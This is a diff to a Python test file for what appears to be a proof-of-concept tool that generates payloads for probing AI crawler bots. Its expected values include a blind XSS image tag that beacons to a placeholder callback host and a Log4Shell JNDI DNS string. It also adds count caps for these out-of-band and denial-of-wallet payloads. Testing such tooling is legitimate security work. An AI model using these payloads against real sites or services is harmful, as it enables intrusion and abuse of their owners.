@@ -2,7 +2,7 @@ import argparse
 import unittest
 from pathlib import Path
 
-from generate import add_payload, make_payload, render_page
+from generate import add_payload, make_payload, parse_args, payload_limit, render_page
 
 
 class GeneratorTests(unittest.TestCase):
@@ -35,9 +35,8 @@ class GeneratorTests(unittest.TestCase):
                                custom=None)
         self.assertEqual(
             payload,
-            '\"><img src=x onerror="this.onerror=null;fetch('
-            "'http://callback.example.test/base/ai-bot-poc/test%20token/1',"
-            "{mode:'no-cors'})\">",
+            '<img src=x onerror="this.onerror=null;(new Image).src='
+            "'http://callback.example.test/base/ai-bot-poc/test%20token/1'\">",
         )
 
     def test_log4j_uses_only_the_hostname_from_a_callback_url(self):
@@ -46,14 +45,24 @@ class GeneratorTests(unittest.TestCase):
                                custom=None)
         self.assertEqual(payload, "${jndi:dns://dns.example.test/ai-bot-poc-t-1}")
 
-    def test_every_entry_has_a_distinct_payload(self):
-        for kind in ("marker", "cache-bust", "blind-xss", "log4j-dns"):
+    def test_every_allowed_entry_has_a_distinct_payload(self):
+        limits = {"marker": 1_000, "cache-bust": 1_000,
+                  "blind-xss": 12, "log4j-dns": 10}
+        for kind, limit in limits.items():
             payloads = {
                 make_payload(kind, n=n, target="https://example.test", token="t",
                              callback="callback.example.test", custom=None)
-                for n in range(1, 1_001)
+                for n in range(1, limit + 1)
             }
-            self.assertEqual(len(payloads), 1_000, kind)
+            self.assertEqual(len(payloads), limit, kind)
+            self.assertEqual(payload_limit(kind), limit)
+
+    def test_oob_defaults_and_limits_follow_curated_catalogs(self):
+        self.assertEqual(parse_args(["https://example.test", "--payload", "blind-xss"]).count, 12)
+        self.assertEqual(parse_args(["https://example.test", "--payload", "log4j-dns"]).count, 10)
+        with self.assertRaisesRegex(ValueError, "at most 12"):
+            make_payload("blind-xss", n=13, target="https://example.test", token="t",
+                         callback="callback.example.test", custom=None)
 
     def test_static_web_interface_has_safety_cap_and_download(self):
         source = (Path(__file__).parent.parent / "index.html").read_text(encoding="utf-8")
@@ -64,6 +73,7 @@ class GeneratorTests(unittest.TestCase):
         self.assertIn("URL.createObjectURL", source)
         self.assertIn("<h2>DoS / Denial of Wallet</h2>", source)
         self.assertIn("<h2>OOB attacks</h2>", source)
+        self.assertIn('"blind-xss": 12', source)
         self.assertIn("callback.required = needsCallback", source)
 
 
